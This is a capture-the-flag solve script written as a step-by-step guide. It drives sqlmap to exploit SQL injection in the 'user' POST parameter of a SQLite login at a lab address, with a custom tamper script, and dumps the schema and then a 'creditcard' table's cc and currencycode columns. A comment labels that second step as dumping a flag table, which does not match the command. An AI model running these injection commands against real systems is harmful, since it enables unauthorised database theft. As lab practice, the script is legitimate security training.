echo "please open the script and read comments"
echo "also run those commands manually don't ruen solve.sh as a real script it is more a step by step guide"

# use sqlmap git version because today last released version of sqlmai is 1.2.11(.0) but we need a fix in 1.2.11.12
# see issue https://github.com/sqlmapproject/sqlmap/issues/3377
# see PR https://github.com/sqlmapproject/sqlmap/commit/dc5edf1a86186da22a93abfa8b4a2c7cd321bc89
# see PR https://github.com/sqlmapproject/sqlmap/commit/abb911d7412411fe265fcae298524af1b7023649
# I comment the next commands because you don't want it to be runned everytime
#git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
# cd sqlmap-dev

# also copy mixedcase.py and sqlitemixedcase into sqlmap tamper script folder


### !!!!!!!!! ###
# you can skip --flush-session, I used it for test purpose

# recon -> get tables and columns
python2 sqlmap.py -u http://172.18.0.1:4567/auth --method=POST --data='user=ehatley0&pass=b' --dbms=SQLite --os=linux --risk 3 --no-escape
 --prefix='"' --technique=BU --string=Welcome --union-cols=2-5 --union-char=1 --flush-session --tamper=sqlitemixedcase --dump --schema --no-cast --threads 10 --encoding ascii
# answer to each question like that
# sqlmap got a 303 redirect to 'http://172.18.0.1:4567/login?message=Wrong credentials!'. Do you want to follow? [Y/n] Y
# redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
# POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N


# I workaround https://github.com/sqlmapproject/sqlmap/issues/3382 by creating sqlitemixedcase.py but tehre is still the boggus LIMIT that is not processed see https://github.com/sqlmapproject/sqlmap/issues/3384

# dump table 123flag123 column flag
python2 sqlmap.py -u http://172.18.0.1:4567/auth --method=POST --data='user=ehatley0&pass=b' --dbms=SQLite --os=linux --risk 3 --no-escape --prefix='"' --technique=BU --string=Welcome --union-cols=2-5 --union-char=1 --flush-session --tamper=sqlitemixedcase --dump -T creditcard -X cc -X currencycode --no-cast --threads 10
# !!!
# currently sqlmap bug where all columns are returned as blank
